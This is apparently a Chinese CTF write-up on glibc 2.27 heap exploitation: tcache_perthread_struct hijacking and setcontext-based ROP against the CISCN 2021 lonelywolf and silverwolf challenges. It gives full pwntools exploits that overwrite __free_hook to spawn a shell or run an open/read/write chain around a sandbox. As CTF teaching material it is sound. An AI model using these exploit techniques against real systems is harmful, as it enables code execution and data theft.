# 劫持tcache_perthread_struct结构体

## tcache_perthread_struct结构体

    
    
    /* We overlay this structure on the user-data portion of a chunk when
       the chunk is stored in the per-thread cache.  */
    typedef struct tcache_entry
    {
      struct tcache_entry *next;
    } tcache_entry;
    /* There is one of these for each thread, which contains the
       per-thread cache (hence "tcache_perthread_struct").  Keeping
       overall size low is mildly important.  Note that COUNTS and ENTRIES
       are redundant (we could have just counted the linked list each
       time), this is for performance reasons.  */
    typedef struct tcache_perthread_struct
    {
      char counts[TCACHE_MAX_BINS];
      tcache_entry *entries[TCACHE_MAX_BINS];
    } tcache_perthread_struct;
    
    
    
    TCACHE_MAX_BINS:
    # define TCACHE_MAX_BINS        64
    

堆地址的第一个chunk：  
tcache_perthread_struct的chunk头：0x11字节  
counts数组一共占用64字节,每个字节对应着一个链表,用来存放对应链表中存放着chunk的数量 0x40  
entry指针数组是用来存储每个链表中链表头的chunk地址，一共占用8 _64字节 0x40_ 8

正好0x251字节

## counts数组

plmalloc 是根据 count 数组中对应值来判断存放 chunk 的数量的

![](./img/5510958410536513314.png)

## entry指针数组

指向的是chunk的fd地址 而非首地址

## CISCN 2021 初赛 lonelywolf

### ida

    
    
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      __int64 v3[5]; // [rsp+0h] [rbp-28h] BYREF
    
      v3[1] = __readfsqword(0x28u);
      setbuf(a1, a2, a3);
      while ( 1 )
      {
        puts("1. allocate");
        puts("2. edit");
        puts("3. show");
        puts("4. delete");
        puts("5. exit");
        __printf_chk(1LL, "Your choice: ");
        __isoc99_scanf(&unk_F44, v3);
        switch ( v3[0] )
        {
          case 1LL:
            add();
            break;
          case 2LL:
            edit();
            break;
          case 3LL:
            show();
            break;
          case 4LL:
            delete();
            break;
          case 5LL:
            exit(0);
          default:
            puts("Unknown");
            break;
        }
      }
    }
    
    
    
    unsigned __int64 add()
    {
      size_t v1; // rbx
      void *v2; // rax
      size_t size; // [rsp+0h] [rbp-18h] BYREF
      unsigned __int64 v4; // [rsp+8h] [rbp-10h]
    
      v4 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_F44, &size);
      if ( !size )    //这里只有idx=0 才能往下执行
      {
        __printf_chk(1LL, "Size: ");
        __isoc99_scanf(&unk_F44, &size);
        v1 = size;
        if ( size > 0x78 )    //size < 0x78
        {
          __printf_chk(1LL, "Too large");
        }
        else
        {
          v2 = malloc(size);
          if ( v2 )
          {
            qword_202050 = v1;
            buf = v2;
            puts("Done!");
          }
          else
          {
            puts("allocate failed");
          }
        }
      }
      return __readfsqword(0x28u) ^ v4;
    }
    
    
    
    unsigned __int64 edit()
    {
      _BYTE *v0; // rbx
      char *v1; // rbp
      __int64 v3; // [rsp+0h] [rbp-28h] BYREF
      unsigned __int64 v4; // [rsp+8h] [rbp-20h]
    
      v4 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_F44, &v3);
      if ( !v3 )     //这里也一样
      {
        if ( buf )
        {
          __printf_chk(1LL, "Content: ");
          v0 = buf;
          if ( qword_202050 )
          {
            v1 = (char *)buf + qword_202050;
            while ( 1 )
            {
              read(0, v0, 1uLL);
              if ( *v0 == 10 )
                break;
              if ( ++v0 == v1 )
                return __readfsqword(0x28u) ^ v4;
            }
            *v0 = 0;
          }
        }
      }
      return __readfsqword(0x28u) ^ v4;
    }
    
    
    
    unsigned __int64 show()
    {
      __int64 v1; // [rsp+0h] [rbp-18h] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-10h]
    
      v2 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_F44, &v1);
      if ( !v1 && buf )
        __printf_chk(1LL, "Content: %s\n", (const char *)buf);
      return __readfsqword(0x28u) ^ v2;
    }
    
    
    
    unsigned __int64 delete()
    {
      __int64 v1; // [rsp+0h] [rbp-18h] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-10h]
    
      v2 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_F44, &v1);
      if ( !v1 && buf )
        free(buf);
      return __readfsqword(0x28u) ^ v2;
    }
    

### 思路

这个题限制了索引为0，只能对最近的chunk进行操作，而且申请的chunk不能大于0x78，但是能够修改fd指针，所以这里用劫持tcache_perthread_struct结构体的方式来泄露libc，然后打一个free_hook

### 详细流程

    
    
    add(0x60)
    delete()
    edit(p64(0)*2)
    

首先覆盖一下key值

![](./img/6400510938789740746.png)

    
    
    delete()
    show()
    heap_addr=u64(p.recvuntil('\x0a',drop = True)[-6:].ljust(8,'\x00'))-0x260
    leak('heap_addr ',heap_addr)
    

然后直接double free泄露堆地址

![](./img/1469970001613475363.png)

    
    
    add(0x60)
    edit(p64(heap_addr+0x10))
    

去改一下fd指针

![](./img/7570771118331253559.png)

    
    
    add(0x60)
    add(0x60)
    edit(p64(0)*4+p64(0x7000000))
    

把0x250大小地tcache bin链表数量改为7

![](./img/3729587370774355867.png)

![](./img/7599296459318139401.png)

    
    
    delete()
    show()
    libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-0x3ebca0
    leak('libc_base ',libc_base)
    free_hook = libc_base + libc.sym['__free_hook']
    leak('free_hook ',free_hook)
    system = libc_base + libc.sym['system']
    
    add(0x60)
    edit(p64(0)*8+p64(free_hook))
    

然后先释放一下最开始的0x251的chunk，泄露出libc地址，然后申请一下这个chunk再去修改entry指针

![](./img/6063933186449377645.png)

![](./img/5077059597606021686.png)  
tcachebins 的 0x20链表处已经成功把 free_hook 写入了

    
    
    add(0x10)
    edit(p64(system))
    

成功把 free_hook 修改成system

![](./img/4374713670893214751.png)

    
    
    add(0x20)
    edit('/bin/sh\x00')
    

![](./img/7955139366773876200.png)

    
    
    delete()
    

![](./img/2225677581941484545.png)

### exp

    
    
    import os
    import sys
    import time
    from pwn import *
    from ctypes import *
    
    context.os = 'linux'
    context.log_level = "debug"
    
    s       = lambda data               :p.send(str(data))
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(str(data))
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
    uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    x64_32 = 1
    
    if x64_32:
        context.arch = 'amd64'
    else:
        context.arch = 'i386'
    
    #p=process("./pwn")
    p=process(['ld-2.27.so','./pwn'],env={"LD_PRELOAD":'./libc-2.27.so'})
    #p=remote('node4.anna.nssctf.cn',28167)
    elf = ELF('./pwn')
    libc=ELF('./libc-2.27.so')
    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def menu(idx):
        sla('Your choice: ',str(idx))
    
    def duan():
        gdb.attach(p)
        pause()
    
    def add(size):
        menu(1)
        sla('Index: ',str(0))
        sla('Size: ',str(size))
    
    def edit(content):
        menu(2)
        sla('Index: ',str(0))
        sla('Content: ',content)
    
    def show():
        menu(3)
        sla('Index: ',str(0))
    
    def delete():
        menu(4)
        sla('Index: ',str(0))
    
    add(0x60)
    delete()
    edit(p64(0)*2)
    delete()
    show()
    heap_addr=u64(p.recvuntil('\x0a',drop = True)[-6:].ljust(8,'\x00'))-0x260
    leak('heap_addr ',heap_addr)
    
    add(0x60)
    edit(p64(heap_addr+0x10))
    add(0x60)
    add(0x60)
    edit(p64(0)*4+p64(0x7000000))
    delete()
    show()
    libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-0x3ebca0
    leak('libc_base ',libc_base)
    free_hook = libc_base + libc.sym['__free_hook']
    leak('free_hook ',free_hook)
    system = libc_base + libc.sym['system']
    
    add(0x60)
    edit(p64(0)*8+p64(free_hook))
    
    duan()
    add(0x10)
    edit(p64(system))
    
    add(0x20)
    edit('/bin/sh\x00')
    delete()
    '''
    '''
    #duan()
    itr()
    

# setcontext

## 背景知识

堆题中开启沙箱后，我们很容易可以构造orw的ROP链，但是调用是个问题，这时候就有了setcontext这种攻击手法，  
函数实现：  
![](./img/1283774907496389512.png)  
它的作用是通过 rdi 寄存器附近的地址里的值来给设置各个寄存器的值

## glibc2.27

通常从 setcontext + 53 开始使用，  
也就是 mov rsp, [rdi+0A0h] 开始  
上面的 fldenv byte pte [rcx] 会造成程序执行时直接 crash

    
    
    rsp的值由rdi决定的，rdi非常好控制了 我们执行free函数 rdi的值就是被释放的chunk的用户区地址
    只控制rsp是没有作用的，因为他不能够执行，我们需要把rop链弹到rip里面，这里就需要ret指令，最后确实有ret指令
    
    .text:00000000000521D7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]
    .text:00000000000521DE 51                            push    rcx
    实际上是给我们的rip赋值
    .text:00000000000521FD 31 C0                         xor     eax, eax
    rax最后会被设置为0

## [CISCN 2021 初赛]silverwolf

### ida

    
    
    Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    
    
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
     0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
     0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
     0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
     0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
     0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0009: 0x06 0x00 0x00 0x00000000  return KILL
    
    
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      __int64 v3[5]; // [rsp+0h] [rbp-28h] BYREF
    
      v3[1] = __readfsqword(0x28u);
      setbuf();
      while ( 1 )
      {
        puts("1. allocate");
        puts("2. edit");
        puts("3. show");
        puts("4. delete");
        puts("5. exit");
        __printf_chk(1LL, "Your choice: ");
        __isoc99_scanf(&unk_1144, v3);
        switch ( v3[0] )
        {
          case 1LL:
            add();
            break;
          case 2LL:
            edit();
            break;
          case 3LL:
            show();
            break;
          case 4LL:
            delete();
            break;
          case 5LL:
            exit(0);
          default:
            puts("Unknown");
            break;
        }
      }
    }
    
    
    
    unsigned __int64 add()
    {
      size_t v1; // rbx
      void *v2; // rax
      size_t size; // [rsp+0h] [rbp-18h] BYREF
      unsigned __int64 v4; // [rsp+8h] [rbp-10h]
    
      v4 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_1144, &size);
      if ( !size )
      {
        __printf_chk(1LL, "Size: ");
        __isoc99_scanf(&unk_1144, &size);
        v1 = size;
        if ( size > 0x78 )
        {
          __printf_chk(1LL, "Too large");
        }
        else
        {
          v2 = malloc(size);
          if ( v2 )
          {
            qword_202050 = v1;
            buf = v2;
            puts("Done!");
          }
          else
          {
            puts("allocate failed");
          }
        }
      }
      return __readfsqword(0x28u) ^ v4;
    }
    
    
    
    unsigned __int64 edit()
    {
      _BYTE *v0; // rbx
      char *v1; // rbp
      __int64 v3; // [rsp+0h] [rbp-28h] BYREF
      unsigned __int64 v4; // [rsp+8h] [rbp-20h]
    
      v4 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_1144, &v3);
      if ( !v3 )
      {
        if ( buf )
        {
          __printf_chk(1LL, "Content: ");
          v0 = buf;
          if ( qword_202050 )
          {
            v1 = buf + qword_202050;
            while ( 1 )
            {
              read(0, v0, 1uLL);
              if ( *v0 == 0xA )
                break;
              if ( ++v0 == v1 )
                return __readfsqword(0x28u) ^ v4;
            }
            *v0 = 0;
          }
        }
      }
      return __readfsqword(0x28u) ^ v4;
    }
    
    
    
    unsigned __int64 show()
    {
      __int64 v1; // [rsp+0h] [rbp-18h] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-10h]
    
      v2 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_1144, &v1);
      if ( !v1 && buf )
        __printf_chk(1LL, "Content: %s\n");
      return __readfsqword(0x28u) ^ v2;
    }
    
    
    
    unsigned __int64 delete()
    {
      __int64 v1; // [rsp+0h] [rbp-18h] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-10h]
    
      v2 = __readfsqword(0x28u);
      __printf_chk(1LL, "Index: ");
      __isoc99_scanf(&unk_1144, &v1);
      if ( !v1 && buf )
        free(buf);
      return __readfsqword(0x28u) ^ v2;
    }
    

### 思路

思路就是开启了沙箱，然后限制了申请堆块的大小要小于等于 0x78
，同时只能对最近的一个堆块进行操作，直接修改tcache_pethread_struct结构体，用orw打就可以

### 详细流程

开启沙箱本身会有一些chunk

![](./img/6503080689711445209.png)  
这里我们选取tcachebins未使用的0x30的链来做题

    
    
    add(0x28)
    delete()
    edit(p64(0)*2)
    

首先还是覆盖一下key

![](./img/3681166684087772171.png)

    
    
    delete()
    show()
    k=u64(p.recvuntil('\x0a',drop=True)[-6:].ljust(8,'\x00'))
    heap_addr=(k&0xffffffffff000)-0x1000
    

![](./img/7717103171218420970.png)  
泄露出来的堆地址经过简单运算得出堆的基地址

![](./img/154408338414073916.png)

    
    
    add(0x28)
    edit(p64(heap_addr+0x10))
    

把 tcache 结构体链入0x30的 tcache bin 链中

![](./img/1692371891272222373.png)

    
    
    add(0x28)
    add(0x28)
    edit(p64(0)*4+p64(0x7000000))
    

申请出来直接修改结构体

![](./img/406549768626918862.png)

![](./img/74327886140182097.png)

    
    
    delete()
    
    show()
    libc_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ebca0
    free_hook=libc_base+libc.sym['__free_hook']
    setcontext=libc_base+libc.sym['setcontext']+53
    

成功释放到unsorted bin中

![](./img/516027538092797932.png)

    
    
    add(0x48)
    edit(p64(0)*8+p64(heap_addr+0x50))
    

再次从tcache 结构体中申请chunk 然后再次修改 entry指针

![](./img/7034225292468279522.png)

![](./img/2817630684393484393.png)

    
    
    add(0x18)
    edit(p64(0)*2+p64(heap_addr+0x50))
    

然后再次申请修改0x40的链表，以便后续申请修改更多的数据

![](./img/1294266606223364502.png)

![](./img/240644956749778867.png)

    
    
    add(0x38)
    pl=p64(free_hook)+p64(heap_addr+0x1000)+p64(heap_addr+0x10a0)
    pl+=p64(heap_addr+0x1000)+p64(heap_addr+0x2000)+p64(0)+p64(heap_addr+0x2000+0x58)
    edit(pl)
    

能够修改足够多的数据后，再次修改tcache 结构体  
0x20: 修改free_hook  
0x30: heap_addr+0x1000 写入'./flag\x00\x00'  
0x40: heap_addr+0x10a0 迁移到堆上的rop链  
0x50: heap_addr+0x1000 后续调用  
0x60: heap_addr+0x2000 写入orw 前一部分  
0x70: 无作用  
0x80: heap_addr+0x2000+0x58 写入orw剩下的一部分

![](./img/8194130388778847832.png)

    
    
    add(0x18)
    edit(p64(setcontext))
    add(0x28)
    edit('./flag\x00\x00')
    add(0x38)
    edit(p64(heap_addr+0x2000)+p64(ret))
    
    rax=0x000000000001b500+libc_base
    rdi=0x000000000002164f+libc_base
    rsi=0x0000000000023a6a+libc_base
    rdx=0x0000000000001b96+libc_base
    ret=0x00000000000008aa+libc_base
    syscall=libc_base+libc.sym['alarm']+0x5
    
    flag_addr=heap_addr+0x1000
    rop_open=p64(rdi)+p64(flag_addr)
    rop_open+=p64(rsi)+p64(0)
    rop_open+=p64(rax)+p64(2)
    rop_open+=p64(syscall)
    
    rop_read=p64(rdi)+p64(3)
    rop_read+=p64(rsi)+p64(flag_addr)
    rop_read+=p64(rdx)+p64(0x100)
    rop_read+=p64(rax)+p64(0)
    rop_read+=p64(syscall)
    
    rop_write=p64(rdi)+p64(1)
    rop_write+=p64(rsi)+p64(flag_addr)
    rop_write+=p64(rdx)+p64(0x100)
    rop_write+=p64(rax)+p64(1)
    rop_write+=p64(syscall)
    
    pl=rop_open+rop_read+rop_write
    
    add(0x58)
    edit(pl[:0x58])
    
    add(0x78)
    edit(pl[0x58:])
    

![](./img/7712466714907805704.png)  
成功写入rop链

    
    
    add(0x48)
    delete()
    

成功读取

![](./img/7861440402559496892.png)

### exp

    
    
    import os
    import sys
    import time
    from pwn import *
    from ctypes import *
    
    context.os = 'linux'
    context.log_level = "debug"
    
    s       = lambda data               :p.send(str(data))
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(str(data))
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
    uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    x64_32 = 1
    
    if x64_32:
        context.arch = 'amd64'
    else:
        context.arch = 'i386'
    
    #p=process('./pwn')
    p=process(['ld-2.27.so',"./pwn"],env={"LD_PRELOAD":'./libc-2.27.so'})
    #p=remote('node3.anna.nssctf.cn',28438)
    elf = ELF('./pwn')
    libc=ELF('./libc-2.27.so')
    #libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    
    def add(size):
        sla('Your choice: ','1')
        sla('Index: ','0')
        sla('Size: ',str(size))
    
    def edit(content):
        sla('Your choice: ','2')
        sla('Index: ','0')
        sla('Content: ',content)
    
    def show():
        sla(b'Your choice: ','3')
        sla('Index: ','0')
    
    def delete():
        sla('Your choice: ','4')
        sla('Index: ','0')
    
    def duan():
        gdb.attach(p)
        pause()
    
    add(0x28)
    delete()
    edit(p64(0)*2)
    delete()
    add(0x28)
    show()
    k=u64(p.recvuntil("\x0a",drop = True)[-6:].ljust(8,b'\x00'))
    heap_addr=(k&0xfffffffff000)-0x1000
    leak('heap_addr ',heap_addr)
    
    edit(p64(heap_addr+0x10))
    
    add(0x28)
    add(0x28)
    edit(p64(0)*4+p64(0x7000000))
    
    delete()
    show()
    
    libc_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-0x3ebca0
    leak("libc_addr :",libc_addr)
    free_hook = libc_addr + libc.sym['__free_hook']
    setcontext = libc_addr + libc.sym['setcontext'] + 53
    
    add(0x48)
    
    
    edit(p64(0)*8+p64(heap_addr+0x50))
    
    add(0x18)
    edit(p64(0)*2+p64(heap_addr+0x50))
    
    add(0x38)
    payload = p64(free_hook)+p64(heap_addr+0x1000)+p64(heap_addr+0x1000+0xa0)   #0x20 0x30 0x40
    payload += p64(heap_addr+0x1000)+p64(heap_addr+0x2000)+p64(0)+p64(heap_addr+0x2000+0x58) #0x50 0x60 0x70 0x80
    edit(payload)
    
    ret_addr = libc_addr + 0x00000000000008aa
    rdi_addr = libc_addr + 0x000000000002164f
    rsi_addr = libc_addr + 0x0000000000023a6a
    rdx_addr = libc_addr + 0x0000000000001b96
    rax_addr = libc_addr + 0x000000000001b500
    syscall = libc_addr + libc.sym['alarm']+0x5
    # ret_addr = libc_addr + 0x0000000000023eeb
    # rdi_addr = libc_addr + 0x00000000000215bf
    # rsi_addr = libc_addr + 0x0000000000023eea
    # rdx_addr = libc_addr + 0x0000000000001b96
    # rax_addr = libc_addr + 0x0000000000043ae8
    # syscall = libc_addr + libc.sym['alarm']+0x5
    add(0x18)#
    edit(p64(setcontext))
    
    add(0x28)#
    edit('./flag\x00\x00')
    
    add(0x38)#
    
    edit(p64(heap_addr+0x2000)+p64(ret_addr))
    
    #open
    flag_addr = heap_addr + 0x1000
    rop_open = p64(rdi_addr)+p64(flag_addr)
    rop_open += p64(rsi_addr)+p64(0)
    rop_open += p64(rax_addr)+p64(2)
    rop_open += p64(syscall)
    #read
    rop_read = p64(rdi_addr)+p64(3)
    rop_read += p64(rsi_addr)+p64(flag_addr)
    rop_read += p64(rdx_addr)+p64(0x30)
    rop_read += p64(rax_addr)+p64(0)
    rop_read += p64(syscall)
    #write
    rop_write = p64(rdi_addr)+p64(1)
    rop_write += p64(rsi_addr)+p64(flag_addr)
    rop_write += p64(rdx_addr)+p64(0x30)
    rop_write += p64(rax_addr)+p64(1)
    rop_write += p64(syscall)
    payload = rop_open+rop_read+rop_write
    
    add(0x58) #
    edit(payload[:0x58])
    
    add(0x78) #
    edit(payload[0x58:])
    add(0x48)
    
    #gdb.attach(p,'b *'+str(heap_addr+0x2000))
    #pause(0)
    '''
    '''
    delete()
    print(p.recv())
    #duan()
    itr()
    

